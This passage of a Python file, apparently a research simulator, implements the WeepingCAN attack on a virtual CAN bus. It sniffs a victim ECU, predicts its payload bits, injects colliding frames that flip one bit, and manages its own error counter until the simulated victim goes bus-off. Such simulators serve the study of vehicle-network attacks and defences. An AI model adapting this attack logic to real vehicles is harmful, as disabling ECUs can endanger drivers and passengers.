        self.victim_ecu = None
        for ecu in self.master.ecus.values():
            if getattr(ecu, 'arb_id', None) == self.victim_id and getattr(ecu, 'name', '') != self.name:
                self.victim_ecu = ecu
                break

        print(f"[ATTACKER] Selected victim: ID=0x{self.victim_id:03X}")
        print(f"[ATTACKER] Total messages: {len(self.victim_messages)}")

        # FIX timing: se abbiamo il riferimento della ECU nel simulatore, usiamo direttamente il suo tx_period
        if self.victim_ecu is not None:
            self.avg_interval = float(self.victim_ecu.tx_period)
            self.next_attack_time = float(getattr(self.victim_ecu, "next_tx_time", time.time() + self.avg_interval))
            print(f"[ATTACKER] Using VICTIM tx_period (ground truth): {self.avg_interval:.3f}s")
            return

        # fallback: stima da vcan sniffing
        if len(self.victim_messages) > 1:
            timestamps = [msg['timestamp'] for msg in self.victim_messages]
            self.avg_interval = self._estimate_interval(timestamps)
            self.last_victim_time = max(timestamps) if timestamps else None
            self.next_attack_time = (self.last_victim_time + self.avg_interval) if (self.last_victim_time is not None and self.avg_interval is not None) else None

            if self.avg_interval is not None:
                print(f"[ATTACKER] Average transmission interval: {self.avg_interval:.3f}s (robust)")
            else:
                print("[ATTACKER] Could not estimate interval")
        else:
            print(f"[ATTACKER] Only {len(self.victim_messages)} message(s) found for victim")
            self.victim_id = None

    def _analyze_victim_bits(self):
        """Analizza i bit dei messaggi della vittima e calcola le probabilità."""
        if not self.victim_messages:
            print("[ATTACKER] No victim messages to analyze")
            return

        print(f"\n[ATTACKER] Analyzing bit patterns of victim {hex(self.victim_id)}...")

        all_bits = [msg['bits'] for msg in self.victim_messages]

        if not all(len(bits) == len(all_bits[0]) for bits in all_bits):
            print("[ATTACKER] ⚠️ Messages have different lengths, using minimum length")
            min_len = min(len(bits) for bits in all_bits)
            all_bits = [bits[:min_len] for bits in all_bits]

        num_bits = len(all_bits[0])

        self.victim_bit_probabilities = []
        for bit_pos in range(num_bits):
            bit_values = [bits[bit_pos] for bits in all_bits]
            prob_zero = sum(1 for b in bit_values if b == 0) / len(bit_values)
            prob_one = 1 - prob_zero
            self.victim_bit_probabilities.append({
                'position': bit_pos,
                'prob_0': prob_zero,
                'prob_1': prob_one
            })

        print(f"\n[ATTACKER] Bit probability analysis (top 10 most predictable):")
        print(f"{'='*80}")

        sorted_probs = sorted(
            self.victim_bit_probabilities,
            key=lambda x: max(x['prob_0'], x['prob_1']),
            reverse=True
        )

        for prob in sorted_probs[:10]:
            byte_idx = prob['position'] // 8
            bit_idx = 7 - (prob['position'] % 8)

            if prob['prob_0'] > prob['prob_1']:
                print(f"  Bit {prob['position']:2d} (Byte {byte_idx}, Bit {bit_idx}): "
                      f"{prob['prob_0']*100:.1f}% sempre 0 (DOMINANT)")
            else:
                print(f"  Bit {prob['position']:2d} (Byte {byte_idx}, Bit {bit_idx}): "
                      f"{prob['prob_1']*100:.1f}% sempre 1 (RECESSIVE)")

        print(f"{'='*80}\n")

    def _reinforcement_learning(self):
        """Reinforcement learning: verifica predizioni e aggiusta probabilità."""
        if self.victim_id not in self.sniffed_data_2 or len(self.sniffed_data_2[self.victim_id]) == 0:
            print("[ATTACKER]  No reinforcement data collected. Skipping reinforcement.")
            return

        reinforcement_messages = self.sniffed_data_2[self.victim_id]

        print(f"[ATTACKER] Verifying predictions on {len(reinforcement_messages)} messages...")

        correct_predictions = 0
        total_bits = 0

        for msg in reinforcement_messages:
            bits = msg['bits']
            for prob in self.victim_bit_probabilities:
                pos = prob['position']
                if pos < len(bits):
                    predicted = 0 if prob['prob_0'] > prob['prob_1'] else 1
                    actual = bits[pos]
                    if predicted == actual:
                        correct_predictions += 1
                    total_bits += 1

        if total_bits > 0:
            accuracy = correct_predictions / total_bits * 100
            print(f"[ATTACKER] Prediction accuracy: {accuracy:.2f}%")
        else:
            print("[ATTACKER] No bits to verify.")

    def _wait_for_victim_transmission(self) -> bool:
        """Aspetta fino al momento in cui la vittima sta per trasmettere."""
        lead = 0.0005

        # Se abbiamo riferimento ECU, usa next_tx_time (ground truth) con guard-rail.
        if self.victim_ecu is not None:
            while self.running and not self.is_bus_off():
                if self.victim_ecu.is_bus_off():
                    return False

                now = time.time()
                nxt = float(getattr(self.victim_ecu, "next_tx_time", now + 0.01))
                dt = nxt - now
                cycle_ts = nxt

                # quando siamo nella finestra: NON basta il tempo, vogliamo che la vittima sia davvero pending nel master
                if dt <= lead:
                    # anti-doppio attacco: soglia realistica (1ms, non 1e-6)
                    if self._last_attacked_cycle_ts is not None and abs(cycle_ts - self._last_attacked_cycle_ts) < 1e-3:
                        time.sleep(0.001)
                        continue

                    # aspetta che la vittima abbia effettivamente enqueue-ato la tx
                    deadline = nxt + 0.02  # 20ms di margine (puoi ridurre)
                    while self.running and time.time() < deadline and not self.is_bus_off():
                        try:
                            with self.master.lock:
                                victim_pending = any(
                                    (ecu is self.victim_ecu and arb_id == self.victim_id)
                                    for (ecu, _data, arb_id, _r0) in self.master.pending
                                )
                        except Exception:
                            victim_pending = False

                        if victim_pending:
                            self._pending_cycle_ts = cycle_ts
                            return True

                        time.sleep(0.0002)  # 0.2ms: yield leggero

                    # se non l’abbiamo vista pending, comunque esci (meglio skip che partire “prima”)
                    return False

                time.sleep(min(max(0.0, dt - lead), 0.01))
            return False

        # fallback su next_attack_time
        if self.avg_interval is None:
            time.sleep(0.2)
            return False

        if self.last_victim_time is not None:
            self.next_attack_time = self.last_victim_time + self.avg_interval

        if self.next_attack_time is None:
            time.sleep(0.2)
            return False

        while self.running and not self.is_bus_off():
            now = time.time()
            dt = self.next_attack_time - now - lead
            if dt <= 0:
                break
            time.sleep(min(dt, 0.01))

        self.next_attack_time += self.avg_interval

    def _reduce_tec(self, num_messages: int = None):
        """Riduce il TEC inviando frame 'innocui' con ID basso (priorità alta).

        Requisiti:
        - ID variabile ad ogni frame (non sempre lo stesso), mantenendo comunque priorità alta (ID basso).
        - 1..3 frame per round (se num_messages non specificato).
        - payload completamente random (8 byte indipendenti ad ogni invio).
        """

        if num_messages is None:
            num_messages = random.randint(1, 3)
        else:
            num_messages = int(num_messages)

        # ID da evitare (best effort): quelli osservati durante sniffing + victim.
        observed = set(self.seen_ids) if self.seen_ids else set()
        if self.victim_id is not None:
            observed.add(self.victim_id)

        # Range di ID ad alta priorità: [0x010, upper] con upper < victim_id per restare prioritari.
        if self.victim_id is not None:
            upper = max(0x010, min(int(self.victim_id) - 1, 0x1FF))
        else:
            upper = 0x1FF

        # Cursore per cambiare ID ad ogni invio.
        if getattr(self, "_reset_id_cursor", None) is None:
            base = int(self.victim_id) - random.randint(1, 5) if self.victim_id is not None else 0x100
            self._reset_id_cursor = max(0x010, min(base, upper))

        def pick_next_id() -> int:
            # Avanza di un passo pseudo-random (1..5) e trova un ID non osservato (best effort).
            for _ in range(64):
                step = random.randint(1, 5)
                cand = self._reset_id_cursor + step
                if cand > upper:
                    span = max(1, (upper - 0x010 + 1))
                    cand = 0x010 + ((cand - 0x010) % span)
                self._reset_id_cursor = cand
                if cand not in observed:
                    return cand
            return int(self._reset_id_cursor)

        # Non rubare la finestra della vittima e non fare burst troppo aggressivi.
        if self.victim_ecu is not None:
            period = float(getattr(self.victim_ecu, "tx_period", 3.0))
            gap = max(0.03, min(0.20, (0.7 * period) / max(1, num_messages)))
        else:
            gap = 0.05

        for _ in range(num_messages):
            if self.victim_ecu is not None and self.victim_ecu.get_time_until_tx() <= (self.master.collect_window * 2.5 + gap):
                break

            reset_id = pick_next_id()
            reset_data = bytes(random.randint(0, 255) for _ in range(8))
            self.master.submit_transmission(self, reset_data, reset_id, r0=BitValue.RECESSIVE)
            time.sleep(gap)

    def _bits_to_bytes_msb(self, bits, nbytes=8):
        """Converte lista di bit (0/1) in bytes (MSB-first per byte)."""
        out = bytearray(nbytes)
        nb = min(len(bits), nbytes * 8)
        for pos in range(nb):
            if bits[pos]:
                b = pos // 8
                k = 7 - (pos % 8)
                out[b] |= (1 << k)
        return bytes(out)

    def _get_recent_victim_payloads(self, max_n=32):
        """
        Estrae gli ultimi max_n payload della vittima dai messaggi sniffati.
        Usa msg['data'] se c'è, altrimenti ricostruisce da msg['bits'].
        """
        msgs = []
        if hasattr(self, "victim_messages") and self.victim_messages:
            msgs = self.victim_messages
        # fallback: se vuoi includere reinforcement
        if hasattr(self, "sniffed_data_2") and self.victim_id in self.sniffed_data_2:
            msgs = msgs + self.sniffed_data_2[self.victim_id]

        payloads = []
        for m in msgs[-max_n:]:
            if isinstance(m, dict) and 'data' in m and m['data'] is not None:
                d = m['data']
                if isinstance(d, (bytes, bytearray)) and len(d) >= 8:
                    payloads.append(bytes(d[:8]))
                    continue
            if isinstance(m, dict) and 'bits' in m and m['bits'] is not None:
                payloads.append(self._bits_to_bytes_msb(m['bits'], nbytes=8))

        # tieni solo validi
        payloads = [p for p in payloads if isinstance(p, (bytes, bytearray)) and len(p) == 8]
        return payloads

    def _learn_next_payload_from_history(self, payloads):
        from collections import Counter
        """
        Predice il prossimo payload in modo GENERICO (learning):
        - se un byte ha un delta ricorrente (mod 256), applica quel delta
        - altrimenti lo lascia uguale all'ultimo visto
        - se trova una coppia 16-bit con delta ricorrente (mod 65536), la tratta come contatore 16-bit
        """
        if not payloads:
            return bytes([0]*8)

        last = payloads[-1]
        n = len(payloads)
        if n < 2:
            return bytes(last)

        # 1) prova a scoprire se c'è un contatore 16-bit (big endian o little endian)
        best16 = None  # (i, endian, confidence)
        for i in range(7):
            # big endian word = b[i]<<8 | b[i+1]
            deltas_be = []
            deltas_le = []
            for t in range(1, n):
                w0_be = (payloads[t-1][i] << 8) | payloads[t-1][i+1]
                w1_be = (payloads[t][i] << 8) | payloads[t][i+1]
                deltas_be.append((w1_be - w0_be) & 0xFFFF)

                w0_le = (payloads[t-1][i+1] << 8) | payloads[t-1][i]
                w1_le = (payloads[t][i+1] << 8) | payloads[t][i]
                deltas_le.append((w1_le - w0_le) & 0xFFFF)

            c_be = Counter(deltas_be)
            c_le = Counter(deltas_le)
            (d_be, f_be) = c_be.most_common(1)[0]
            (d_le, f_le) = c_le.most_common(1)[0]
            conf_be = f_be / max(1, len(deltas_be))
            conf_le = f_le / max(1, len(deltas_le))

            # soglia: deve essere molto consistente
            if conf_be >= 0.85 and d_be in (1, 0, 0xFFFF, 2, 3):
                cand = (i, "be", conf_be, d_be)
                if best16 is None or cand[2] > best16[2]:
                    best16 = cand
            if conf_le >= 0.85 and d_le in (1, 0, 0xFFFF, 2, 3):
                cand = (i, "le", conf_le, d_le)
                if best16 is None or cand[2] > best16[2]:
                    best16 = cand

        # 2) predizione byte-by-byte con delta ricorrente (mod 256)
        pred = bytearray(last)

        # se ho un 16-bit forte, applicalo e poi evito di sovrascrivere quei 2 byte
        blocked = set()
        if best16 is not None:
            i, endian, conf, delta16 = best16
            blocked.add(i); blocked.add(i+1)
            if endian == "be":
                w = (last[i] << 8) | last[i+1]
                w_next = (w + delta16) & 0xFFFF
                pred[i] = (w_next >> 8) & 0xFF
                pred[i+1] = w_next & 0xFF
            else:
                w = (last[i+1] << 8) | last[i]
                w_next = (w + delta16) & 0xFFFF
                pred[i] = w_next & 0xFF
                pred[i+1] = (w_next >> 8) & 0xFF

        for j in range(8):
            if j in blocked:
                continue
            deltas = []
            for t in range(1, n):
                deltas.append((payloads[t][j] - payloads[t-1][j]) & 0xFF)
            c = Counter(deltas)
            d, f = c.most_common(1)[0]
            conf = f / max(1, len(deltas))

            # se delta è molto consistente, applicalo (counter-like)
            if conf >= 0.85 and d in (0, 1, 0xFF, 2, 3):
                pred[j] = (last[j] + d) & 0xFF
            else:
                pred[j] = last[j]  # default: persistenza

        return bytes(pred)

    def _create_attack_message(self) -> bytes:
        """Crea il payload d'attacco (DATA 8 byte) con predizione SEQUENZIALE (learned) + flip solo bit target."""
        import math
        import random

        # Default probabilità se non ho info
        probs0 = [0.5] * 64
        probs1 = [0.5] * 64
        weights = [1.0] * 64

        if self.victim_bit_probabilities:
            for d in self.victim_bit_probabilities:
                try:
                    pos = int(d.get('position', 0))
                except Exception:
                    continue
                if 0 <= pos < 64:
                    p0 = float(d.get('prob_0', 0.5))
                    p1 = float(d.get('prob_1', 0.5))
                    s = p0 + p1
                    if s > 0:
                        p0, p1 = p0 / s, p1 / s
                    probs0[pos] = max(0.0, min(1.0, p0))
                    probs1[pos] = max(0.0, min(1.0, p1))
                    try:
                        weights[pos] = max(0.01, float(d.get('weight', 1.0)))
                    except Exception:
                        weights[pos] = 1.0

        # ===== 1) Predizione SEQUENZIALE (learned) del prossimo payload =====
        payload_hist = self._get_recent_victim_payloads(max_n=32)
        if not payload_hist:
            # fallback: se non ho history, usa MAP come prima
            predicted_bits = [0 if probs0[i] >= probs1[i] else 1 for i in range(64)]
        else:
            predicted_payload = self._learn_next_payload_from_history(payload_hist)
            predicted_bits = []
            for b in range(8):
                for k in range(7, -1, -1):
                    predicted_bits.append(1 if (predicted_payload[b] >> k) & 1 else 0)

        # ===== 2) Selezione candidati (identica alla tua) =====
        candidates = []
        for i in range(64):
            if predicted_bits[i] == 0:
                base = probs0[i] * weights[i]
                penalty = (1.0 + self._bit_attack_counts[i]) ** 0.70
                score = base / penalty
                candidates.append((i, score))

        if not candidates:
            return bytes([0] * 8)

        candidates.sort(key=lambda x: x[1], reverse=True)
        topk = candidates[: max(1, int(self.attack_topk_bits))]

        # ===== 3) Scelta randomizzata (identica alla tua) =====
        if random.random() < float(self.attack_eps_explore):
            chosen_pos = random.choice([p for p, _ in topk])
        else:
            temp = max(1e-3, float(self.attack_softmax_temp))
            scores = [s for _, s in topk]
            mx = max(scores)
            expw = [math.exp((s - mx) / temp) for s in scores]
            tot = sum(expw)
            r = random.random() * tot
            acc = 0.0
            chosen_pos = topk[-1][0]
            for (pos, _), w in zip(topk, expw):
                acc += w
                if acc >= r:
                    chosen_pos = pos
                    break

        # ===== 4) Flip SOLO del bit scelto (0 -> 1) =====
        predicted_bits[chosen_pos] = 1
        self._bit_attack_counts[chosen_pos] += 1

        byte_idx = chosen_pos // 8
        bit_idx = 7 - (chosen_pos % 8)
        conf0 = probs0[chosen_pos] * 100.0

        # Pack bits -> 8 bytes (MSB-first)
        payload = bytearray(8)
        for pos in range(64):
            if predicted_bits[pos]:
                b = pos // 8
                k = 7 - (pos % 8)
                payload[b] |= (1 << k)

        return bytes(payload)

    def _attack_loop(self):
        """Loop attacco con gestione TEC:
        - se TEC troppo alto: NO ATTACK (cooldown), invia più reset frames per scendere
        - se TEC medio: attacca con probabilità < 1 e ripulisce di più
        - se TEC basso: attacca regolarmente
        """

        import random
        attack_count = 0

        while self.running and not self.is_bus_off():
            if self.victim_ecu is not None and self.victim_ecu.is_bus_off():
                return

            # Se TEC è troppo alto: cooldown (non attaccare finché non scendi)
            if self.tec >= self.tec_hard_limit:
                print(f"[ATTACKER]  COOLDOWN: TEC={self.tec} >= {self.tec_hard_limit}, stop attack e ripulisco...")
                # prova a scendere verso tec_target (best effort, _reduce_tec può interrompersi per non disturbare la vittima)
                while self.running and not self.is_bus_off() and self.tec > self.tec_target:
                    self._reduce_tec(num_messages=self.max_reset_per_round)
                    time.sleep(0.01)
                # dopo cooldown riprendi il loop normale
                continue

            # Aspetta finestra vittima (un ciclo)
            ok = self._wait_for_victim_transmission()
            if not self.running:
                break
            if not ok: 
                print("[ATTACKER] Desync: victim not pending, skip this cycle")
                time.sleep(0.001)
                continue 

            # marca ciclo (anti multi-submit nello stesso ciclo)
            if self._pending_cycle_ts is not None:
                self._last_attacked_cycle_ts = self._pending_cycle_ts
                self._pending_cycle_ts = None

            # Probabilità di attacco dipendente dal TEC (se TEC sale, attacca meno)
            # Probabilità di attacco dipendente dal TEC (mai 1.0)
            if self.tec <= 24:
                p_attack = 0.85
            elif self.tec <= self.tec_soft_limit:  # 72
                span = float(self.tec_soft_limit - 24)
                p_attack = 0.85 - (0.85 - 0.35) * ((self.tec - 24) / span)
            else:  # 72..88
                span = max(1.0, float(self.tec_hard_limit - self.tec_soft_limit))
                p_attack = 0.35 - (0.35 - 0.10) * min(1.0, (self.tec - self.tec_soft_limit) / span)

            p_attack = max(0.10, min(0.85, p_attack))
            do_attack = (random.random() < p_attack)

            if not do_attack:
                print(f"[ATTACKER]  Skip attack this cycle (TEC={self.tec}, p_attack={p_attack:.2f}) -> ripulisco TEC")
                if self.tec > 0:
                    self._reduce_tec(num_messages=min(self.max_reset_per_round, 3))
                time.sleep(0.01)
                continue

            # --- ATTACK ---
            attack_count += 1
            attack_data = self._create_attack_message()

            # Stesso ID, R0 recessive (l'attacco è nel DATA bit)
            self.master.submit_transmission(self, attack_data, self.victim_id, r0=self.attack_r0)

            # Dai tempo al master di processare collisione
            time.sleep(0.05)

            # --- TEC cleanup ---
            # Per WeepingCAN, dopo ogni colpo serve “compensare” l'aumento TEC dell'attaccante con più successi.
            # Qui proviamo (best effort) a mandare più reset frames quando TEC è medio/alto.
            # --- TEC cleanup ---
            if self.tec > 0:
                if self.tec <= 16:
                    n_reset = 0
                elif self.tec <= 40:
                    n_reset = 2
                elif self.tec <= self.tec_soft_limit:  # 72
                    n_reset = 4
                else:
                    n_reset = self.max_reset_per_round  # 16

                print(f"[ATTACKER]  Post-attack TEC cleanup: TEC={self.tec} -> send up to {n_reset} reset frames")
                if n_reset > 0:
                    self._reduce_tec(num_messages=n_reset)

            time.sleep(0.01)


# --- Main ---
def main():
    print("="*100)
    print("WEEPING CAN ATTACK SIMULATOR - BIT-LEVEL ANALYSIS + REINFORCEMENT LEARNING")
    print("="*100)

    master = CANBusMaster(use_vcan=True)
    master.start()

    # Create ECUs
    ecu_a = BaseECU("ECU_A", 1, 0x100, master, tx_period=5.0, start_delay=2.0)
    ecu_b = BaseECU("ECU_B", 2, 0x200, master, tx_period=6.0, start_delay=2.0)
    ecu_c = BaseECU("ECU_C", 3, 0x300, master, tx_period=9.0, start_delay=2.0)
    ecu_d = BaseECU("ECU_D", 4, 0x400, master, tx_period=14.0, start_delay=2.0)

    ecus = [ecu_a, ecu_b, ecu_c, ecu_d]
    # Payload totalmente random per ogni ECU (richiesto)
    for ecu in ecus:
        ecu.random_payload = True

    # Create attacker (150s training + 30s reinforcement)
    attacker = WeepingAttacker(master, sniff_duration_1=150, sniff_duration_2=30)

    # Start all
    attacker.start()
    for ecu in ecus:
        ecu.start()

    print("\n=== Simulation running ===\n")

    victim_ecu = None

    try:
        while True:
            time.sleep(1)

            # Trova la vittima
            if attacker.victim_id and victim_ecu is None:
                for ecu in ecus:
                    if ecu.arb_id == attacker.victim_id:
                        victim_ecu = ecu
                        print(f"\n[MAIN] Victim identified: {victim_ecu.name} (ID={hex(victim_ecu.arb_id)})")
                        break

            # Check victim bus-off
            if victim_ecu and victim_ecu.is_bus_off():
                print(f"\n{'='*100}")
                print(f" ATTACK SUCCESSFUL! ")
                print(f"Victim {victim_ecu.name} (ID={hex(victim_ecu.arb_id)}) is in BUS-OFF state")
                print(f"{'='*100}\n")
                break

            # Check attacker bus-off
            if attacker.is_bus_off():
                print(f"\n{'='*100}")
                print(f" ATTACK FAILED! ")
                print(f"Attacker went BUS-OFF before victim")
                print(f"{'='*100}\n")
                break

    except KeyboardInterrupt:
        print("\n=== Simulation interrupted ===")

    # STAMPA FINALE TEC/REC
    print(f"\n{'='*100}")
    print("FINAL STATUS - TEC/REC of all ECUs")
    print(f"{'='*100}")

    for ecu in ecus:
        print(
            f"  [{ecu.name:8s}] ID=0x{ecu.arb_id:03X} | TEC={ecu.tec:3d} "
            f"REC={ecu.rec:3d} | {ecu.state.name:13s}"
        )

    print(
        f"  [{attacker.name:8s}] ID=0x{attacker.arb_id:03X} | TEC={attacker.tec:3d} "
        f"REC={attacker.rec:3d} | {attacker.state.name:13s}"
    )

    print(f"{'='*100}\n")

    # Stop all
    attacker.stop()
    for ecu in ecus:
        ecu.stop()
    master.stop()

    print("\n=== Simulation ended ===")


if __name__ == "__main__":
    main()
